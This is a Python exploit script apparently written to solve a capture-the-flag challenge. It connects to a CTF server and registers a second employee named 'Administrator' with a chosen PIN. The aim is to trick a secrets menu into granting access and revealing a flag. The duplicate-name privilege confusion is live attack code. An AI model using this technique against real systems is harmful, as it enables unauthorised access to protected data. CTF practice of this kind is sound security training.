#!/usr/bin/env python3
"""
Try creating another "Administrator" - maybe view_secrets checks the wrong one
"""

import socket
import time

HOST = 'chals.uscc-cyberbowl-2025.ctf.institute'
PORT = 3013

def send_recv(sock, cmd):
    print(f"[>] {cmd}")
    sock.sendall(cmd.encode() + b'\n')
    time.sleep(0.4)
    data = sock.recv(8192).decode('latin-1', errors='ignore')
    return data

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)
    sock.connect((HOST, PORT))
    print("[+] Connected\n")
    
    # Get banner
    send_recv(sock, '')
    
    # Create employee named "Administrator" with PIN 484
    print("[*] Creating second 'Administrator' with PIN 484...")
    send_recv(sock, '1')
    send_recv(sock, 'Administrator')  # Same name!
    data = send_recv(sock, '484')
    print(data[:300])
    
    # List employees
    print("\n[*] Listing employees:")
    data = send_recv(sock, '4')
    print(data[:600])
    
    # Access secrets - maybe it finds OUR Administrator first?
    print("\n[*] Accessing secrets...")
    data = send_recv(sock, '3')
    print(data)
    
    time.sleep(1)
    try:
        more = sock.recv(4096).decode('latin-1', errors='ignore')
        if more:
            print(more)
            if 'USCC{' in more or 'granted' in more.lower():
                print("\n" + "="*60)
                print("[!!!] SUCCESS - FLAG ABOVE [!!!]")
                print("="*60)
    except:
        pass
    
    sock.close()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
